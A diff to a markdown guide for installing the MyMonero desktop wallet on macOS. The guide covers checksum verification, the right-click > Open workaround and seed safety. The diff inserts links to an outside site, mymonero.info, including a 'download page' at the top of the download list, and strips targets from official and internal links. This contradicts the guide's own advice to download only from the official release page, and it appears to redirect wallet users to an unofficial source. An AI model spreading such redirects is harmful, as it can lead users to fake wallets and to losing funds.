@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 MyMonero desktop's final release is v1.3.3, with a macOS .dmg on the official GitHub release page. Download that file from the project, compare its SHA-256 value with the published value, then use macOS's right-click > Open option if the system blocks the app.
 
+
+For a second walkthrough, see [MyMonero app not opening on mymonero.info](https://mymonero.info/mymonero-app-not-opening). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [MyMonero safety facts](https://mymonero.info/is-mymonero-safe).
+
 ## You'll see this if
 - You want to install MyMonero desktop on a Mac.
 - macOS says the downloaded app cannot be opened.
@@ -43,18 +46,18 @@ Installing the app and restoring a wallet are separate. MyMonero seeds can be 13
 6. **Use the macOS block workaround only for the verified app.** If macOS says the app cannot be opened because it is from an unidentified developer or downloaded from the internet, locate the app in Finder, right-click it, and choose **Open**. Confirm the prompt only after you have verified the download and are comfortable proceeding. Do not use this step to bypass concerns about a file with an unknown origin or hash mismatch.
 7. **Launch the wallet.** Open MyMonero from the location where you installed it. If you already have a wallet, choose the appropriate open or restore path. Never enter seed words into a browser, installer, or support message.
 8. **Restore carefully when needed.** A 13-word seed is MyMonero-specific and legacy; a 25-word seed is standard Monero. Use a compatible recovery method and inspect your private backup locally. For more guidance, see [13-word seed restore](./mymonero-13-word-seed-restore.md) and [25-word seed migration](./mymonero-25-word-seed-migration.md).
-9. **Allow scanning to finish.** The wallet may need to scan history after restoration. Restore height is the block height at which scanning starts; earlier is safer if uncertain, but takes longer. Read [MyMonero restore height explained](./mymonero-restore-height-explained.md).
+9. **Allow scanning to finish.** The wallet may need to scan history after restoration. Restore height is the block height at which scanning starts; earlier is safer if uncertain, but takes longer. Read MyMonero restore height explained.
 
 > [!WARNING]
 > Never share a seed to install, open, or verify the application. Nobody legitimate needs your recovery words, and a request to enter them on a web page is a reason to stop.
 
 ---
 ## If that did not work
-If the SHA-256 value differs, do not launch the app. Make sure the command used the actual downloaded file and that you compared it with the value for the macOS asset, not another package. The [MyMonero desktop repository](https://github.com/monero-projects/mymonero-desktop-wallet) provides project release information.
+If the SHA-256 value differs, do not launch the app. Make sure the command used the actual downloaded file and that you compared it with the value for the macOS asset, not another package. The MyMonero desktop repository provides project release information.
 
 If macOS still blocks the verified application, confirm you are using Finder's right-click > Open on the app itself, and review the system prompt before proceeding. Do not disable protections broadly or use an unverified download. The desktop app is no longer maintained, so consider whether continuing with it is appropriate for you.
 
-If the app opens but your balance or activity is missing, this is a wallet restoration or scan question, not an installation issue by itself. Check that the seed format is supported, the intended wallet was restored, and the restore height includes the activity period. Consult [MyMonero balance shows zero](./mymonero-balance-shows-zero.md) and transaction not showing. Keep your seed private at all times.
+If the app opens but your balance or activity is missing, this is a wallet restoration or scan question, not an installation issue by itself. Check that the seed format is supported, the intended wallet was restored, and the restore height includes the activity period. Consult MyMonero balance shows zero and transaction not showing. Keep your seed private at all times.
 
 ## Prevention
 - Get the .dmg only from the project’s official GitHub release page.
@@ -93,6 +96,7 @@ No. It still opens wallets and sends XMR, but is no longer maintained and has no
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
